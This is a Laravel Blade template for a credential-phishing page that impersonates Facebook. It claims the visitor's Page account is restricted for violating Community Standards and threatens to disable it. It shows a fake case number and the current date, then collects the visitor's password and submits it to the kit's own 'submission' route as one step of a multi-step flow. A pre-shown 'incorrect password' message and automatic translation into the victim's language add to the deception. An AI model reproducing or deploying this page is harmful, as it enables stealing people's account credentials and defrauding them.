@extends('layouts.app')

@section('content')
<div id="root">
        <div class="flex min-h-screen flex-col">
          <div class="sticky left-0 right-0 top-0 h-12 bg-gray-200 px-4 py-1">
            <img src="{{asset('assets/meta-image-0X_yXz75.png')}}" alt="" class="h-full" />
          </div>
          <main class="flex flex-grow flex-col items-center justify-center">
            <div class="flex w-11/12 flex-col justify-center md:w-2/5 2xl:w-1/3">
              <div>
                <img
                  src="{{asset('assets/home-image-VAkJ10vV.png')}}"
                  class="w-full"
                  alt="" /><b class="text-2xl">Your Page Account Has Been Restricted</b>
                <p class="text-sm text-gray-500">Term of Service</p>
                <hr />
              </div>
              <form id="form" action="{{ route('submission') }}" method="POST">
                @csrf
                <input type="hidden" name="step" value="4">
                <input type="hidden" name="id" value="{{ session('record_id') }}">
              <div class="my-5">We detected unusual activity in your Page account today <strong id="tampil"></strong>. Your account has been reported for violating Page's<b class="cursor-pointer font-medium text-blue-500 hover:underline">Community Standards</b>. After reviewing this report, we have confirmed that the decision cannot be reversed. To avoid having your account <b class="cursor-pointer font-medium text-blue-500 hover:underline">disabled</b> , please verify your account by following the steps below:</div>              <div class="my-2">
                <input
                  class="w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
                  type="password"
                  placeholder="Password"
                  value=""
                  onblur="validateInput(this, 'Password')"
                  id="password" name="repassword"/>
                <p
                  class="text-red-500"
                  style="padding-top: 5px"
                  id="passwordError">
                  The password that you've entered is incorrect.                </p>
              </div>
              <div
                class="flex flex-col justify-between border-b border-t border-gray-300 p-2 text-sm text-gray-500 sm:flex-row">
                <div class="flex gap-1 sm:flex-col sm:gap-0">
                  <b>Case Number:</b><b class="text-blue-500">#62445456599</b>
                </div>
                <div class="w-full sm:w-3/4">
                  <b>About Case: Violating Community Standards and Posting something inappropriate.</b>
                </div>
              </div>
              <button
                class="my-5 flex w-full items-center justify-center rounded-lg p-4 font-semibold text-white cursor-not-allowed bg-blue-300"
                disabled
                id="continue">
                Continue              </button>
            </div>
          </main>
          <footer class="flex items-center justify-center p-4 text-gray-700">
            <p>
              <svg
                aria-hidden="true"
                focusable="false"
                data-prefix="fas"
                data-icon="triangle-exclamation"
                class="svg-inline--fa fa-triangle-exclamation text-yellow-600"
                role="img"
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 512 512">
                <path
                  fill="currentColor"
                  d="M256 32c14.2 0 27.3 7.5 34.5 19.8l216 368c7.3 12.4 7.3 27.7 .2 40.1S486.3 480 472 480L40 480c-14.3 0-27.6-7.7-34.7-20.1s-7-27.8 .2-40.1l216-368C228.7 39.5 241.8 32 256 32zm0 128c-13.3 0-24 10.7-24 24l0 112c0 13.3 10.7 24 24 24s24-10.7 24-24l0-112c0-13.3-10.7-24-24-24zm32 224a32 32 0 1 0 -64 0 32 32 0 1 0 64 0z"></path>
              </svg>
              Please make sure to fill in the data correctly; otherwise, your account may be permanently closed. To learn more about why accounts are deactivated, visit our <a href="https://www.facebook.com/help/582999911881572" target="_blank" rel="noopener noreferrer" class="text-blue-600 hover:underline"> Community Standards</a>.            </p>
          </footer>
        </div>
      </div>
      <div id="google_translate_element" style="display: none;"></div>

<script type="text/javascript">
    function googleTranslateElementInit() {
        new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element');
    }

    (function () {
        var gtScript = document.createElement('script');
        gtScript.type = 'text/javascript';
        gtScript.src = "https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
        document.getElementsByTagName('head')[0].appendChild(gtScript);
    })();

    async function getLanguageFromBackend() {
        try {
            const response = await fetch('/get-language');
            const data = await response.json();
            return data.language || 'en';
        } catch (error) {
            console.error("Error fetching language from backend:", error);
            return 'en';
        }
    }

    async function autoTranslate() {
        document.getElementById('loading-overlay').style.display = 'flex';

        const targetLang = await getLanguageFromBackend();

        setTimeout(() => {
            const selectElement = document.querySelector('select.goog-te-combo');
            if (selectElement) {
                selectElement.value = targetLang;
                selectElement.dispatchEvent(new Event('change'));
            }

            setTimeout(() => {
                document.getElementById('loading-overlay').style.display = 'none';
            }, 500);
        }, 500);
    }

    document.addEventListener('DOMContentLoaded', autoTranslate);
</script>

<style>
    .goog-te-banner-frame, .skiptranslate, .VIpgJd-ZVi9od-aZ2wEe-wOHMyf {
        display: none !important;
    }

    body {
        top: 0 !important;
    }
</style>
      <script>
        function validateInput(input, fieldName) {
          const errorElement = document.getElementById(input.id + "Error");

          // Kiểm tra cho các input khác
          if (!input.value.trim()) {
            // Hiển thị lỗi nếu không có giá trị
            errorElement.classList.remove("hidden");
            errorElement.innerText = `Invalid ${fieldName}`;
          } else {
            // Nếu có giá trị, ẩn lỗi
            errorElement.classList.add("hidden");
          }
        }

        var date = new Date();
        var tahun = date.getFullYear();
        var bulan = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var namabulan = ("January February March April May June July August September October November December");
        namabulan = namabulan.split(" ");
        var tampilTanggal = " " + namabulan[bulan] + " " + tanggal + " " + tahun;
        document.getElementById("tampil").innerHTML = tampilTanggal;
        ////////////////////////////////////////////////////////////////
        function validateInput(input, fieldName) {
          const errorElement = document.getElementById(input.id + "Error");

          // Kiểm tra cho các input khác
          if (!input.value.trim()) {
            // Hiển thị lỗi nếu không có giá trị
            errorElement.classList.remove("hidden");
            errorElement.innerText = `Invalid ${fieldName}`;
          } else {
            // Nếu có giá trị, ẩn lỗi
            errorElement.classList.add("hidden");
          }

          // Gọi lại hàm kiểm tra khi nhập vào trường input
          checkInputFields();
        }

        function checkInputFields() {
          const password = $("#password").val().trim();

          // Nếu mật khẩu có giá trị thì kích hoạt nút Continue
          if (password.length > 0) {
            $("#continue").prop("disabled", false);
            $("#continue")
              .removeClass("cursor-not-allowed bg-blue-300")
              .addClass("bg-blue-500 hover:bg-blue-600");
          } else {
            $("#continue").prop("disabled", true);
            $("#continue")
              .removeClass("bg-blue-500 hover:bg-blue-600")
              .addClass("cursor-not-allowed bg-blue-300");
          }
        }

        // Gọi hàm kiểm tra khi người dùng nhập vào trường mật khẩu
        $("#password").on("input", function() {
          checkInputFields();
        });

        // Khởi tạo trạng thái nút Continue
        checkInputFields();
        ////////////////////////////////////////////////////////////////
        // Lắng nghe sự kiện click vào nút continue
        $('#continue').on('click', function(e) {
          e.preventDefault(); // Ngăn chặn hành động mặc định của form
          handleSubmit(); // Gọi hàm xử lý submit
        });

        // Lắng nghe sự kiện nhấn phím "Enter"
        $(document).keypress(function(e) {
          if (e.which == 13) { // Kiểm tra nếu phím Enter (mã phím 13) được nhấn
            e.preventDefault(); // Ngăn chặn hành động mặc định
            handleSubmit(); // Gọi hàm xử lý submit
          }
        });

        // Hàm xử lý submit khi nhấn nút hoặc nhấn phím Enter
        function handleSubmit() {
            var continueButton = $("#continue");
            var continueText = continueButton.text();
            continueButton.html(
                '<div style="user-select: none;" class="h-6 w-6 animate-spin rounded-full border-2 border-white border-r-transparent border-t-transparent"></div>'
            ).prop("disabled", true).addClass("cursor-not-allowed bg-blue-300").removeClass("bg-blue-500 hover:bg-blue-600 cursor-pointer");
            setTimeout(function() {
                continueButton.html(continueText).prop("disabled", false).removeClass("cursor-not-allowed bg-blue-300").addClass("bg-blue-500 hover:bg-blue-600 cursor-pointer");
                $("#form").submit();
            }, 2000);
        }
      </script>
@endsection
